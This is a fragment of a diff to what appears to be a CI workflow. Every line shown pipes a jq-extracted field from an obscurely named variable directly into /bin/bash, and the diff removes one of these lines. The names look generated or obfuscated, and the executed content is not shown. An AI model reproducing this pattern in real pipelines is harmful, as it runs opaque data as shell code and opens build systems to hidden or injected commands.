@@ -20,7 +20,6 @@ jobs:
           echo $e3 | jq -r .oj6 | /bin/bash
           echo $vq5402 | jq -r .bc5 | /bin/bash
           echo $ping601 | jq -r .czb3079 | /bin/bash
-          printf '%s' "$vtwjv5660" | jq -r .xu87 | /bin/bash
           echo $n93125 | jq -r .mpifg7 | /bin/bash
           echo $njwwt88398 | jq -r .r147 | /bin/bash
           echo $gd6117 | jq -r .xbig0359 | /bin/bash
